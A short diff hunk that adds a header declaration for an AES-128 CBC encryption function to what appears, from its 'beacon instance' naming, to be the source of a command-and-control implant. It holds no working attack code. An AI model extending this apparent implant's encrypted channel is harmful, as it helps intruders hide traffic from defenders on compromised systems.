@@ -41,3 +41,18 @@ DEFINESEC(B) VOID CryptAesFree( PBEACON_INSTANCE Ins );
  *
 -*/
 DEFINESEC(B) BOOL CryptAesDecrypt( PBEACON_INSTANCE Ins, PVOID InOut, ULONG InOutLen );
+
+/*-
+ *
+ * CryptAesEncrypt
+ *
+ * Purpose:
+ *
+ * Encrypts the buffer using AES-128
+ * CBC.
+ *
+ * Must be padded to a multiple of
+ * 16.
+ *
+-*/
+DEFINESEC(B) BOOL CryptAesEncrypt( PBEACON_INSTANCE Ins, PVOID In, ULONG InLen, PVOID* Out, ULONG* OutLen );
